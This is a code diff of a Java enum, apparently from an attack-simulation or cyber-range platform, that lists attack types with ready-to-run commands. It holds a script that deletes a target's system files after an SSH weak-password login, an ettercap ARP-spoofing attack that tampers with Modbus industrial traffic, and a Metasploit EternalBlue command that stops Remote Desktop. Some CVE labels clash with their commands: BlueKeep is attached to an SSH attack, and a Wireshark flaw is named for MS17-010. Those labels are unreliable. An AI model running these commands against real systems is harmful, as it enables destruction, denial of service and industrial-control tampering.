@@ -19,7 +19,7 @@ public enum AttackType {
     TANHUI(5, "17517000425965","瘫毁","destroyed", "./auto-destory.exp ${ip} ${username} ${password}", "CVE-2019-0708（BlueKeep）", "利用SSH弱密码登录Centos操作系统,删除目标机器系统文件，造成系统瘫痪", false),
 
     //欺骗
-    QIPIAN(6, "17517000425966","欺骗","deception", "ettercap -T -F modbus.ef -q -M ARP:remote -w /tmp/network.pcap //192.168.1.89/502 //${modbuscan_ip}/", "ettercap中间人攻击", "利用ettercap进行ARP欺骗，通过脚本识别到modbus协议流量中含有你设定的流量特征来进行更改，可以通过攻击机与目标主机的流量特征来判断效果，还可以攻击时通过登录modbuscan_202507031516靶标观察信号灯的变化", true),
+    QIPIAN(6, "17517000425966","欺骗","deception", "ettercap -T -F modbus.ef -q -M ARP:remote -w /tmp/network.pcap //192.168.1.89/502 //${ip}/", "ettercap中间人攻击", "利用ettercap进行ARP欺骗，通过脚本识别到modbus协议流量中含有你设定的流量特征来进行更改，可以通过攻击机与目标主机的流量特征来判断效果，还可以攻击时通过登录modbuscan_202507031516靶标观察信号灯的变化", true),
 
     //拒止
     JUZHI(7, "17517000425967","拒止","denial-of-service-attack", "msfconsole -q -x \"use windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/exec;set CMD 'net stop termservice /Y';run;exit;\" ", "Wireshark 'add_capabilities()'函数远程拒绝服务漏洞", "利用Windows操作系统的MS17-010漏洞停止目标机器远程桌面服务,造成正常用户无法访问该服务。", false);
